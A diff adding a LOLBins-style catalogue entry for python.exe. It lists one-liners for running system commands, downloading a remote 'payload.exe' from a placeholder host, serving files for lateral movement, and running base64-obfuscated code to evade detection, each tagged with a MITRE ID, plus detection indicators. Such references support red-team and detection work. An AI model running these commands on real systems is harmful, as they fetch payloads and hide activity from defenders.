@@ -1,0 +1,49 @@
+---
+Name: python.exe
+Description: Python interpreter for running Python scripts and code
+Author: LOLBins Project
+Created: 2026-01-16
+Commands:
+  - Command: python.exe -c "import os; os.system('calc.exe')"
+    Description: Execute arbitrary commands using Python's os module
+    Usecase: Execute system commands during security assessments
+    Category: Execute
+    Privileges: User
+    MitreID: T1059.006
+    OperatingSystem: Windows (with Python installed)
+  - Command: python.exe -c "import urllib.request; urllib.request.urlretrieve('http://example.com/payload.exe', 'C:\\temp\\payload.exe')"
+    Description: Download files from remote URLs using Python's urllib
+    Usecase: Download files for security testing without external tools
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows (with Python installed)
+  - Command: python.exe -m http.server 8000
+    Description: Start a simple HTTP server to share files
+    Usecase: Serve files over HTTP for lateral movement or data staging
+    Category: Execute
+    Privileges: User
+    MitreID: T1570
+    OperatingSystem: Windows (with Python installed)
+  - Command: python.exe -c "exec(__import__('base64').b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2NhbGMuZXhlJyk='))"
+    Description: Execute base64-encoded Python code (decodes to 'import os; os.system('calc.exe')')
+    Usecase: Obfuscate malicious commands to evade detection
+    Category: Execute
+    Privileges: User
+    MitreID: T1027
+    OperatingSystem: Windows (with Python installed)
+Full_Path:
+  - Path: C:\Python*\python.exe
+  - Path: C:\Program Files\Python*\python.exe
+  - Path: C:\Users\*\AppData\Local\Programs\Python\Python*\python.exe
+Detection:
+  - IOC: python.exe making unexpected network connections
+  - IOC: python.exe spawned from unusual parent processes
+  - IOC: python.exe with command-line arguments containing base64
+  - IOC: python.exe executing with -c flag from non-interactive sessions
+Resources:
+  - Link: https://docs.python.org/3/
+  - Link: https://attack.mitre.org/techniques/T1059/006/
+Acknowledgement:
+  - Person: Python Software Foundation
+  - Person: Security Research Community
